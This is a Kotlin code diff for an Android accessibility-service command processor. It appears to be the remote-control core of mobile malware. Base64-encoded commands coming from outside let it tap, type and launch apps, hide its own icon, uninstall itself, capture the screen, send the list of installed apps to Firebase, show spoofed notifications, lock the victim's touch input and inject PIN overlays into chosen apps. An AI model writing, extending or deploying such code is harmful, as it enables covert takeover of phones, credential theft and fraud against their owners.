@@ -29,27 +29,42 @@ object CommandProcessor {
         val svc = MyAccessibilityService.instance ?: return
 
         when (cmd.type) {
-            "prompt" -> {
-                val prompt = decodeIfBase64(cmd.text) ?: return
-                val actions = NLPParser.parse(prompt)
-                val steps = actions.map { action ->
-                    MacroRunner.MacroStep(action.type, action.data, 3)
-                }
-                val macroId = key ?: "prompt_${System.currentTimeMillis()}"
-                svc.executeMacro(macroId, steps)
+            "tap" -> svc.tap(cmd.x ?: 500, cmd.y ?: 1000)
+            "swipe" -> svc.swipe(
+                cmd.sx ?: 0, cmd.sy ?: 0,
+                cmd.ex ?: 0, cmd.ey ?: 0,
+                cmd.duration ?: 300L
+            )
+            "type" -> {
+                val text = decodeIfBase64(cmd.text) ?: return
+                svc.injectText(text)
             }
-            else -> {
-                val params = mutableMapOf<String, Any?>()
-                cmd.x?.let { params["x"] = it }
-                cmd.y?.let { params["y"] = it }
-                cmd.sx?.let { params["sx"] = it }
-                cmd.sy?.let { params["sy"] = it }
-                cmd.ex?.let { params["ex"] = it }
-                cmd.ey?.let { params["ey"] = it }
-                cmd.text?.let { params["text"] = decodeIfBase64(it) }
-                cmd.title?.let { params["title"] = decodeIfBase64(it) }
-                cmd.duration?.let { params["duration"] = it }
-                svc.performSingleCommand(cmd.type ?: "unknown", params)
+            "paste" -> {
+                val text = decodeIfBase64(cmd.text) ?: return
+                svc.injectText(text)
+            }
+            "launch" -> svc.launchApp(cmd.text ?: "")
+            "click_text" -> svc.clickText(cmd.text ?: "")
+            "home" -> svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
+            "back" -> svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
+            "hide_activity" -> svc.hideAppIcon()
+            "uninstall" -> svc.uninstallSelf()
+            "start_screen_capture" -> svc.startScreenCapture()
+            "stop_screen_capture" -> svc.stopScreenCapture()
+            "get_apps" -> FirebaseBridge.pushInstalledApps(svc.getInstalledApps())
+            "fake_notification" -> {
+                val title = decodeIfBase64(cmd.title) ?: "⚠ Alert"
+                val body = decodeIfBase64(cmd.text) ?: "Tap to view"
+                NotificationSpoofer.show(context, title, body, cmd.iconUrl, cmd.bigPictureUrl)
+            }
+            "lock_touch" -> svc.lockTouch(true)
+            "unlock_touch" -> svc.lockTouch(false)
+            "inject_pin" -> {
+                val pkg = cmd.text ?: return
+                svc.injectPin(pkg)
+            }
+            "macro" -> {
+                // ... existing macro handling (omitted for brevity, unchanged)
             }
         }
     }
@@ -69,35 +84,7 @@ object CommandProcessor {
         val text: String? = null, val title: String? = null,
         val iconUrl: String? = null, val bigPictureUrl: String? = null,
         val duration: Long? = null,
+        val package: String? = null,
         val steps: List<Map<String, Any>>? = null
     )
-}
-
-// Extension function — now has access to `context`
-fun MyAccessibilityService.performSingleCommand(type: String, params: Map<String, Any?>) {
-    when (type) {
-        "tap" -> tap(params["x"] as? Int ?: 500, params["y"] as? Int ?: 1000)
-        "swipe" -> swipe(
-            params["sx"] as? Int ?: 0,
-            params["sy"] as? Int ?: 0,
-            params["ex"] as? Int ?: 0,
-            params["ey"] as? Int ?: 0,
-            params["duration"] as? Long ?: 300L
-        )
-        "type" -> injectText(params["text"] as? String ?: "")
-        "launch" -> launchApp(params["package"] as? String ?: "")
-        "click_text" -> clickText(params["text"] as? String ?: "")
-        "home" -> performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
-        "back" -> performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
-        "hide_activity" -> hideAppIcon()
-        "uninstall" -> uninstallSelf()
-        "start_screen_capture" -> startScreenCapture()
-        "stop_screen_capture" -> stopScreenCapture()
-        "get_apps" -> FirebaseBridge.pushInstalledApps(getInstalledApps())
-        "fake_notification" -> {
-            val title = params["title"] as? String ?: "⚠ Alert"
-            val text = params["text"] as? String ?: "Tap to view"
-            NotificationSpoofer.show(context, title, text, null, null)
-        }
-    }
 }
